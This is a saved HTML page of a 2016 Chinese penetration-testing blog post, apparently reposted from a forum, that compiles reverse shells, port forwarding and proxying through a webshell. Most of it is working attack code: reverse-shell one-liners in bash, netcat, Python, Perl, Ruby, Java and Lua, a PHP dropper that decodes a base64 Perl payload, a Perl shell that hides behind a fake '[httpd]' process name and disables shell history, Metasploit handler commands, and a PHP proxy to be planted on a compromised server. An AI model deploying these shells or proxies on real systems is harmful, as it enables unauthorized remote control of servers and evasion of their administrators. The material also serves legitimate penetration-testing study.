@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html><head><base href="https://www.virzz.com"/><meta charset="utf-8"/><meta content="chrome=1" http-equiv="X-UA-Compatible"/><title> Web渗透中的反弹Shell与端口转发的奇淫技巧 | Virink's Blog</title><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport"/><meta content="Virink" name="author"/><meta content="0x00 前言
+在做渗透测试时，遇到linux服务器，直观想到反弹shell到本地进行溢出等提权尝试,⽽而其中涉及到的反弹/转发/代理的种种方式,就在此文做一简单小结.
+0x01 反弹shell
+1) Bash
+部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口
+bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/2333 0&amp;gt;&amp;amp;1
+
+2) N" name="description"/><meta content="article" property="og:type"/><meta content="Web渗透中的反弹Shell与端口转发的奇淫技巧 | Virink's Blog" property="og:title"/><meta content="https://www.virzz.com/2016/10/16/Web渗透中的反弹Shell与端口转发的奇淫技巧.html" property="og:url"/><meta content="Virink's Blog" property="og:site_name"/><meta content="0x00 前言
+在做渗透测试时，遇到linux服务器，直观想到反弹shell到本地进行溢出等提权尝试,⽽而其中涉及到的反弹/转发/代理的种种方式,就在此文做一简单小结.
+0x01 反弹shell
+1) Bash
+部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口
+bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/2333 0&amp;gt;&amp;amp;1
+
+2) N" property="og:description"/><meta content="2016-12-12T06:13:40.000Z" property="og:updated_time"/><meta content="summary" name="twitter:card"/><meta content="Web渗透中的反弹Shell与端口转发的奇淫技巧 | Virink's Blog" name="twitter:title"/><meta content="0x00 前言
+在做渗透测试时，遇到linux服务器，直观想到反弹shell到本地进行溢出等提权尝试,⽽而其中涉及到的反弹/转发/代理的种种方式,就在此文做一简单小结.
+0x01 反弹shell
+1) Bash
+部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口
+bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/2333 0&amp;gt;&amp;amp;1
+
+2) N" name="twitter:description"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/favicon.ico" rel="icon" type="image/x-icon"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/favicon.ico" rel="icon"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/font-awesome.min.css" rel="stylesheet"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/uno.css" rel="stylesheet"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/tagscloud.css" rel="stylesheet"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/links.css" rel="stylesheet"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/archive.css" rel="stylesheet"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/jquery.fancybox.css" rel="stylesheet"/><link href="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/monokai-sublime.min.css" rel="stylesheet"/><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/highlight.min.js"></script></head><body><span class="mobile btn-mobile-menu"><i aria-hidden="true" class="fa btn-mobile-menu__icon fa-bars"></i></span><header class="panel-cover panel-cover--collapsed"><div class="panel-main"><div class="panel-main__inner panel-inverted"><div class="panel-main__content"> <a href="/" title="link to homepage for Virink's Blog"><img alt="Virink's Blog logo" class="panel-cover__logo logo" src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/avatar.png" width="80"/></a><h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Virink</a></h1><hr class="panel-cover__divider"/><p class="panel-cover__description"> 探索技術，追求超越。</p><hr class="panel-cover__divider"/><div id="tagscloud"> <a class="tagc1" href="/tags/ctf/">ctf : 13</a><a class="tagc2" href="/tags/php/">php : 11</a><a class="tagc3" href="/tags/writeups/">writeups : 11</a><a class="tagc4" href="/tags/web/">web : 6</a><a class="tagc5" href="/tags/mac/">mac : 4</a><a class="tagc1" href="/tags/thinking/">thinking : 3</a><a class="tagc2" href="/tags/audit/">audit : 3</a><a class="tagc3" href="/tags/linux/">linux : 2</a><a class="tagc4" href="/tags/python/">python : 2</a><a class="tagc5" href="/tags/flask/">flask : 2</a><a class="tagc1" href="/tags/shell/">shell : 2</a><a class="tagc2" href="/tags/ssh/">ssh : 2</a><a class="tagc3" href="/tags/osx/">osx : 1</a><a class="tagc4" href="/tags/mongodb/">mongodb : 1</a><a class="tagc5" href="/tags/debug/">debug : 1</a><a class="tagc1" href="/tags/app/">app : 1</a><a class="tagc2" href="/tags/leanote/">leanote : 1</a><a class="tagc3" href="/tags/go/">go : 1</a><a class="tagc4" href="/tags/mysql/">mysql : 1</a><a class="tagc5" href="/tags/mariadb/">mariadb : 1</a></div><div class="navigation-wrapper"><nav class="cover-navigation cover-navigation--primary"><ul class="navigation"><li class="navigation__item"><a class="blog-button" href="/#blog" title="">博客</a></li><li class="navigation__item"><a class="" href="/archive/" title="">歸檔</a></li><li class="navigation__item"><a class="" href="/links/" title="">友鏈</a></li><li class="navigation__item"><a class="" href="/about/" title="">關於</a></li><li class="navigation__item"><a class="" href="/feed.xml" title="">訂閱</a></li></ul></nav><hr class="panel-cover__divider"/><nav class="cover-navigation navigation--social"><ul class="navigation"><li class="navigation__item"><a href="https://github.com/virink" title="Virink's GitHub"><i class="fa fa-github"></i> <span class="label">GitHub</span></a></li><li class="navigation__item"><a href="https://twitter.com/virinkz" title="Virink's Twitter"><i class="fa fa-twitter"></i> <span class="label">Twitter</span></a></li><li class="navigation__item"><a href="https://telegram.me/virink" title="Virink's Telegram"><i class="fa fa-paper-plane"></i> <span class="label">Telegram</span></a></li></ul></nav></div></div></div><div class="panel-cover--overlay"></div></div></header><div class="content-wrapper"><div class="content-wrapper__inner entry"><article class="post-container post-container--single"><header class="post-header"><h1 class="post-title">Web渗透中的反弹Shell与端口转发的奇淫技巧</h1><div class="post-meta"> <time class="post-meta__date date" datetime="2016-10-16 12:28:56">2016-10-16 12:28:56</time> <span class="post-meta__tags tags">• 標籤: <font class="tags"><a class="tags-link" href="/tags/shell/">shell</a>, <a class="tags-link" href="/tags/web/">web</a></font></span></div></header><section class="article-content post" id="post-content"><h2>0x00 前言</h2><p>在做渗透测试时，遇到linux服务器，直观想到反弹shell到本地进行溢出等提权尝试,⽽而其中涉及到的反弹/转发/代理的种种方式,就在此文做一简单小结.</p><h2>0x01 反弹shell</h2><h3>1) Bash</h3><p>部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口</p><pre><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1
+</code></pre><h3>2) NetCat</h3><p>Netcat反弹shell也是常用兵器,经典命令参数-e</p><pre><code>nc -e /bin/sh x.x.x.x 2333
+</code></pre><p>但某些版本的nc没有-e参数(非传统版),则可使用以下方式解决</p><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc x.x.x.x 2333 &gt;/tmp/f
+</code></pre><p>或者本地监听两个端口,通过管道,一处输入,一处输出</p><pre><code>nc x.x.x.x 2333|/bin/sh|nc x.x.x.x 2444
+</code></pre><p>其他方式基本沿用以上思路,如将nc更换为telnet等</p><pre><code>mknod backpipe p &amp;&amp; telnet x.x.x.x 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe
+</code></pre><h3>3) PHP</h3><p>PHP环境下反弹shell,过去我们通常用phpspy等shell自带反弹即可,这里将其反弹部分代码提取出来,访问即可反弹到指定IP端口一个普通交互shell</p><pre><code>&lt;?php
+function which($pr) {
+$path = execute("which $pr");
+return ($path ? $path : $pr);
+}
+function execute($cfe) {
+$res = '';
+if ($cfe) {
+if(function_exists('exec')) {
+@exec($cfe,$res);
+$res = join("\n",$res);
+} elseif(function_exists('shell_exec')) {
+$res = @shell_exec($cfe);
+} elseif(function_exists('system')) {
+@ob_start();
+[url=https://www.t00ls.net/space-uid-5987.html]@system[/url]($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+} elseif(function_exists('passthru')) {
+@ob_start();
+@passthru($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+} elseif(@is_resource($f = @popen($cfe,"r"))) {
+$res = '';
+while(!@feof($f)) {
+$res .= @fread($f,1024);
+}
+@pclose($f);
+}
+}
+return $res;
+}
+function cf($fname,$text){
+if($fp=@fopen($fname,'w')) {
+@fputs($fp,@base64_decode($text));
+@fclose($fp);
+}
+}
+$yourip = "x.x.x.x";
+$yourport = "2333";
+$usedb = array('perl'=&gt;'perl','c'=&gt;'c');
+$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
+"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
+"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
+"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
+"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
+"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
+"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
+cf('/tmp/.bc',$back_connect);
+$res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;");
+?&gt;
+</code></pre><p>访问,成功返回</p><p>但需要注意php需未禁用exec函数.另外,Metasploit的payload也提供各种反弹脚本,如</p><pre><code>msf &gt; msfpayload php/reverse_php LHOST=x.x.x.x LPORT=2333 R &gt; re.php
+</code></pre><p>将文件传入shell中,在msf中开一个handler</p><pre><code>msf &gt; use multi/handler
+msf exploit(handler) &gt; set PAYLOAD php/reverse_php
+msf exploit(handler) &gt; set LHOST x.x.x.x
+msf exploit(handler) &gt; set LPORT 2333
+msf exploit(handler) &gt; exploit
+</code></pre><p>此时访问re.php,即可反弹到本地一个shell</p><p>当然,用nc直接监听端口也是可以的<br/> 其他可以考虑使用msf编码变形等,github也有这样一个脚本 <a href="https://github.com/keshy/cwg_too" rel="external" target="_blank">https://github.com/keshy/cwg_too</a> ... p-reverse-shell.php 可供参考</p><h3>4) JSP</h3><p>JSP类似,使用msf生成一个反弹shell</p><pre><code>msfpayload java/jsp_shell_reverse_tcp LHOST=x.x.x.x R &gt; re.jsp
+</code></pre><p>然后在msf中开一个handler</p><pre><code>msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set PAYLOAD java/jsp_shell_reverse_tcp
+msf exploit(handler) &gt; set LHOST 192.168.10.1
+msf exploit(handler) &gt; exploit
+</code></pre><p>类似方法即可反弹回shell</p><h3>5) Python</h3><p>一个Python反弹shell的代码demo</p><pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre><p>整洁规范的Python写法应该像是这样,更易懂些:</p><pre><code>import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("x.x.x.x",2333))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);
+</code></pre><p>其他脚本像这样子</p><pre><code>python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('x.x.x.x',2333))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
+</code></pre><p>msf的payload给出这样的解法</p><pre><code>msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333
+</code></pre><p>生成编码后文件:</p><pre><code>import base64;
+exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMC4wLjAuMCcsMjMzMykpCmw9c3RydWN0
+LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YoNDA5NikKd2hpbGUgbGVuKGQpIT1sOgoJZCs9cy5yZWN2KDQwOTYpCmV4ZWMoZCx7J3MnOnN9KQo='))
+</code></pre><p>Base64解码后:</p><pre><code>import socket,struct
+s=socket.socket(2,1)
+s.connect(('x.x.x.x',2333))
+l=struct.unpack('&amp;gt;I',s.recv(4))[0]
+d=s.recv(4096)
+while len(d)!=l:
+d+=s.recv(4096)
+exec(d,{'s':s})
+</code></pre><p>此处补充上phith0n同学的正向连接bind_shell</p><h2>关于交互式正向连接shell，⼏几点需要注意的地⽅方</h2><p>1.不管在linux还是windows下,想要做到交互式,只能开启⼀一个shell.不能够每次接收到命令就再开启⼀一个shell进程,然后执⾏行.<br/> 2.windows下cmd.exe /K参数是保持cmd不结束,/c参数是执⾏行完后就结束,注意区别.</p><p>最终Win版本:</p><pre><code>from socket import *
+import subprocess
+import os, threading
+def send(talk, proc):
+    import time
+    while True:
+        msg = proc.stdout.readline()
+        talk.send(msg)
+if __name__ == "__main__":
+    server=socket(AF_INET,SOCK_STREAM)
+    server.bind(('0.0.0.0',23333))
+    server.listen(5)
+    print 'waiting for connect'
+    talk, addr = server.accept()
+    print 'connect from',addr
+    proc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,
+    stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    t = threading.Thread(target = send, args = (talk, proc))
+    t.setDaemon(True)
+    t.start()
+    while True:
+        cmd=talk.recv(1024)
+        proc.stdin.write(cmd)
+        proc.stdin.flush()
+    server.close()
+</code></pre><p>Linux版本:</p><pre><code>from socket import *
+import subprocess
+import os, threading, sys, time
+if __name__ == "__main__":
+    server=socket(AF_INET,SOCK_STREAM)
+    server.bind(('0.0.0.0',11))
+    server.listen(5)
+    print 'waiting for connect'
+    talk, addr = server.accept()
+    print 'connect from',addr
+    proc = subprocess.Popen(["/bin/sh","-i"],stdin=talk,stdout=talk, stderr=talk, shell=True)
+</code></pre><p>执行后主动连接即可</p><h3>6) Perl</h3><p>首先给一个原理类似的脚本</p><pre><code>perl -e 'use Socket;$i="x.x.x,x";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'
+</code></pre><p>然后是一个不依赖调用/bin/bash的方法</p><pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre><p>一个完整的反弹pl脚本</p><pre><code>#!/usr/bin/perl -w
+# perl-reverse-shell - A Reverse Shell implementation in PERL
+use strict;
+use Socket;
+use FileHandle;
+use POSIX;
+my $VERSION = "1.0";
+# Where to send the reverse shell. Change these.
+my $ip = 'x.x.x.x';
+my $port = 2333;
+# Options
+my $daemon = 1;
+my $auth = 0; # 0 means authentication is disabled and any
+# source IP can access the reverse shell
+my $authorised_client_pattern = qr(^127\.0\.0\.1$);
+# Declarations
+my $global_page = "";
+my $fake_process_name = "/usr/sbin/apache";
+# Change the process name to be less conspicious
+$0 = "[httpd]";
+# Authenticate based on source IP address if required
+if (defined($ENV{'REMOTE_ADDR'})) {
+cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");
+if ($auth) {
+unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
+cgiprint("ERROR: Your client isn't authorised to view this page");
+cgiexit();
+}
+}
+} elsif ($auth) {
+cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access");
+cgiexit(0);
+}
+# Background and dissociate from parent process if required
+if ($daemon) {
+my $pid = fork();
+if ($pid) {
+cgiexit(0); # parent exits
+}
+setsid();
+chdir('/');
+umask(0);
+}
+# Make TCP connection for reverse shell
+socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
+if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
+cgiprint("Sent reverse shell to $ip:$port");
+cgiprintpage();
+} else {
+cgiprint("Couldn't open reverse shell to $ip:$port: $!");
+cgiexit();
+}
+# Redirect STDIN, STDOUT and STDERR to the TCP connection
+open(STDIN, "&amp;gt;&amp;amp;SOCK");
+open(STDOUT,"&amp;gt;&amp;amp;SOCK");
+open(STDERR,"&amp;gt;&amp;amp;SOCK");
+$ENV{'HISTFILE'} = '/dev/null';
+system("w;uname -a;id;pwd");
+exec({"/bin/sh"} ($fake_process_name, "-i"));
+# Wrapper around print
+sub cgiprint {
+my $line = shift;
+$line .= "&amp;lt;p&amp;gt;\n";
+$global_page .= $line;
+}
+# Wrapper around exit
+sub cgiexit {
+cgiprintpage();
+exit 0; # 0 to ensure we don't give a 500 response.
+}
+# Form HTTP response using all the messages gathered by cgiprint so far
+sub cgiprintpage {
+print "Content-Length: " . length($global_page) . "\r
+Connection: close\r
+Content-Type: text\/html\r\n\r\n" . $global_page;
+}
+</code></pre><p>ASP环境下调用perlscript执行方式</p><pre><code>&lt;%@Language=PerlScript%&gt;
+#表明ASP脚本使⽤用语⾔言为Perlscript
+&lt;%
+system("c://Recycler//cmd.exe /c c://Recycler//nc.exe -e cmd.exe -v x.x.x.x 443");
+#⽤用system函数执⾏行命令的⽅方式
+#exec("c://Recycler//cmd.exe /c c://Recycler//nc.exe -e cmd.exe -v x.x.x.x 443");
+#⽤用exec函数执⾏行命令的⽅方式
+%&gt;
+</code></pre><h3>7) Ruby</h3><p>惯例,首先一个调用/bin/sh的</p><pre><code>ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",2333).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+</code></pre><p>一个不依赖于/bin/sh的反弹shell：</p><pre><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+</code></pre><p>Windows环境使用</p><pre><code>ruby -rsocket -e 'c=TCPSocket.new("x.x.x.x","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+</code></pre><p>此外MSF中也有相应模块可以调用,就不多提</p><h3>8) Java</h3><p>给出一个调用/bin/bash的脚本</p><pre><code>r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&amp;lt;&amp;gt;/dev/tcp/x.x.x.x/2333;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done"] as String[])
+p.waitFor()
+</code></pre><p>MSF中也有相应模块可以调用</p><h3>9) Lua</h3><pre><code>lua -e "require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','2333');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"
+</code></pre><p>类似不做解释</p><h2>0x02 端口转发</h2><p>上面总结反弹shell的各种已知主流或非主流方式,下面扯一下端口转发. 已知的大众方式如:</p><ul><li>lcx老牌工具</li><li>htran/fport/fpipe等</li><li>antifw修改3389端口为80</li><li>reduh提供了借助http/https隧道连接3389的另一种方式</li><li>tunna给出了比reduh更稳定快速的解决方法</li></ul><p>在Linux环境下,则可考虑借助脚本实现,如Perl/Python等. 知道创宇Knownsec曾给出一个rtcp.py脚本做转发之用,不过测试发现只支持单点连接,推荐使用此<br/> 脚本,支持多client同时连接</p><pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+import sys
+import socket
+import threading
+import logging
+import optparse
+class PipeThread(threading.Thread):
+def __init__(self, source_fd, target_fd):
+super(PipeThread, self).__init__()
+self.logger = logging.getLogger('PipeThread')
+self.source_fd = source_fd
+self.target_fd = target_fd
+self.source_addr = self.source_fd.getpeername()
+self.target_addr = self.target_fd.getpeername()
+def run(self):
+while True:
+try:
+data = self.source_fd.recv(4096)
+if len(data) &gt; 0:
+self.logger.debug('read %04i from %s:%d', len(data),
+self.source_addr[0], self.source_addr[1])
+sent = self.target_fd.send(data)
+self.logger.debug('write %04i to %s:%d', sent,
+self.target_addr[0], self.target_addr[1])
+else:
+break
+except socket.error:
+break
+self.logger.debug('connection %s:%d is closed.', self.source_addr[0],
+self.source_addr[1])
+self.logger.debug('connection %s:%d is closed.', self.target_addr[0],
+self.target_addr[1])
+self.source_fd.close()
+self.target_fd.close()
+class Forwarder(object):
+def __init__(self, ip, port, remoteip, remoteport, backlog=5):
+self.remoteip = remoteip
+self.remoteport = remoteport
+self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+self.sock.bind((ip, port))
+self.sock.listen(backlog)
+def run(self):
+while True:
+client_fd, client_addr = self.sock.accept()
+target_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+target_fd.connect((self.remoteip, self.remoteport))
+threads = [
+PipeThread(client_fd, target_fd),
+PipeThread(target_fd, client_fd)
+]
+for t in threads:
+t.setDaemon(True)
+t.start()
+def __del__(self):
+self.sock.close()
+if __name__ == '__main__':
+parser = optparse.OptionParser()
+parser.add_option(
+'-l', '--local-ip', dest='local_ip',
+help='Local IP address to bind to')
+parser.add_option(
+'-p', '--local-port',
+type='int', dest='local_port',
+help='Local port to bind to')
+parser.add_option(
+'-r', '--remote-ip', dest='remote_ip',
+help='Local IP address to bind to')
+parser.add_option(
+'-P', '--remote-port',
+type='int', dest='remote_port',
+help='Remote port to bind to')
+parser.add_option(
+'-v', '--verbose',
+action='store_true', dest='verbose',
+help='verbose')
+opts, args = parser.parse_args()
+if len(sys.argv) == 1 or len(args) &gt; 0:
+parser.print_help()
+exit()
+if not (opts.local_ip and opts.local_port and opts.remote_ip and opts.remote_port):
+parser.print_help()
+exit()
+if opts.verbose:
+log_level = logging.DEBUG
+else:
+log_level = logging.CRITICAL
+logging.basicConfig(level=log_level, format='%(name)-11s: %(message)s')
+forwarder = Forwarder(opts.local_ip, opts.local_port, opts.remote_ip, opts.remote_port)
+try:
+forwarder.run()
+except KeyboardInterrupt:
+print 'quit'
+exit()
+</code></pre><p>使用方式如</p><pre><code>python xxx.py -l 0.0.0.0 -p 3389 -r x.x.x.x -P 443
+</code></pre><p>至于Perl脚本,网络中也有相关资料,大家可自行修改使用.<br/> 此外,推荐可结合msf加以免杀使用的tunna :) 具体使用方式细节不再介绍.</p><h2>0x03 开放代理</h2><p>如果对目标服务器已获得较高权限,可添加vpn或socks代理,ringzero@557.im写的 一个可用socks.py脚本可以更易的完成socks代理添加 使用方式如:<br/> nohup python <a href="http://s5.py" rel="external" target="_blank">s5.py</a> 1080 &amp;<br/> 只有Webshell的情况下,又需要对内网某web服务进行访问测试,但没有充足的精力手工借助webshell进行请求,需要将这一过程自动化,xsjswt给出这样一种<br/> 思路.<br/> 将如下脚本以shell权限丢至服务器</p><pre><code>&lt;?php
+if(!isset($_GET['url'])){
+exit(0);
+}
+$ch = curl_init();
+$url=$_GET['url'];
+if(strstr($url,'?')){
+$url.='&amp;';
+}
+else{
+$url.='?';
+}
+unset($_GET['url']);
+foreach($_GET as $Key=&gt;$Val){
+if(get_magic_quotes_gpc()){
+$Val=stripslashes($Val);
+}
+$url=$url.'&amp;'.$Key.'='.urlencode($Val);
+}
+$cookie='';
+foreach($_COOKIE as $Key=&gt;$Val){
+if(get_magic_quotes_gpc()){
+$Val=stripslashes($Val);
+}
+$cookie=$cookie.$Key.'='.urlencode($Val).'; ';
+}
+if($_SERVER['REQUEST_METHOD']=="POST"){
+curl_setopt($ch, CURLOPT_POST, 1);
+$post_data='';
+foreach($_POST as $Key=&gt;$Val){
+if(get_magic_quotes_gpc()){
+$Val=stripslashes($Val);
+}
+$post_data=$post_data.'&amp;'.$Key.'='.urlencode($Val);
+}
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+}
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+curl_setopt($ch, CURLOPT_HEADER, TRUE);
+curl_setopt($ch, CURLOPT_NOBODY, FALSE);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+if(isset($_SERVER['HTTP_REFERER'])){
+curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
+}
+$Response=curl_exec($ch);
+if(!$Response){
+curl_close($ch);
+exit(0);
+}
+$HttpStatus=curl_getinfo($ch,CURLINFO_HTTP_CODE);
+$Header=substr($Response,0,curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+$Body=substr($Response,curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+$Headers=split("\r\n",$Header);
+foreach($Headers as $ThusHead){
+if($ThusHead == 'Transfer-Encoding: chunked' || strstr($ThusHead,'Content-Length')!==false){
+continue;
+}
+header($ThusHead,FALSE);
+}
+echo $Body;
+curl_close($ch);
+?&gt;
+</code></pre><p>另搭建一nginx服务器,添加如下配置</p><pre><code>server {
+    listen 监听端口;
+    location ~ () {
+        proxy_pass http://shell-ip/文件存放目录/proxy.php?url=http://$host/$request_uri;
+        proxy_set_header Host "访问webshell所用域名";
+    }
+}
+</code></pre><p>重新加载nginx配置,本地浏览器http代理设置为nginx服务器ip及监听端口,即可实现初步的代理请求.</p><h2>0x04 小结</h2><p>仅总结常见手法/工具/脚本并加以测试,如各位实战中有奇葩的环境/更有趣的思路/手法,望不吝赐教.</p><h2>0x05 参考资料</h2><ul><li>[1] <a href="http://pentestmonkey.net/cheat-s" rel="external" target="_blank">http://pentestmonkey.net/cheat-s</a> ... e-shell-cheat-sheet</li><li>[2] <a href="http://www.leavesongs.com/PYTHON/python-shell-backdoor.html" rel="external" target="_blank">http://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a></li><li>[3] <a href="http://www.waitalone.cn/linux-shell-rebound-under-way.html" rel="external" target="_blank">http://www.waitalone.cn/linux-shell-rebound-under-way.html</a></li><li>[4] <a href="http://tool.p1ng.pw/getshell.html" rel="external" target="_blank">http://tool.p1ng.pw/getshell.html</a></li><li>[5] 互联网其他相关资料</li></ul><p>来源： <a href="https://www.t00ls.net/articles-31461.html" rel="external" target="_blank">https://www.t00ls.net/articles-31461.html</a></p></section><div class="copyright"> <span>文本標題:</span><a href="/2016/10/16/Web渗透中的反弹Shell与端口转发的奇淫技巧.html" target="_blank">Web渗透中的反弹Shell与端口转发的奇淫技巧</a><br/> <span>文章作者:</span><a href="/" target="_blank" title="回到主頁">Virink</a><br/> <span>發佈時間:</span>2016-10-16 12:28:56<br/> <span>最後更新:</span>2016-12-12 14:13:40<br/> <span>原始鏈接:</span><a class="post-url" href="https://www.virzz.com/2016/10/16/Web渗透中的反弹Shell与端口转发的奇淫技巧.html" target="_blank" title="Web渗透中的反弹Shell与端口转发的奇淫技巧">https://www.virzz.com/2016/10/16/Web渗透中的反弹Shell与端口转发的奇淫技巧.html</a><br/> <span>轉載聲明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。</div></article><footer class="footer"><center> <span class="footer__copyright">© 2016-2017. | ❤ <a href="mailto:virink@outlook.com">Virink</a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span> <span>本站採用<i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span></center></footer></div></div><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/jquery.min.js"></script><script>!window.jQuery&&document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/main.js"></script><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/scale.fix.js"></script><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/tagcloud.js"></script><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/jquery.fancybox.js"></script><script type="text/javascript">$(document).ready(function(){$(".fancybox").fancybox({padding:0,helpers:{overlay:{locked:!1}}})})</script><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's 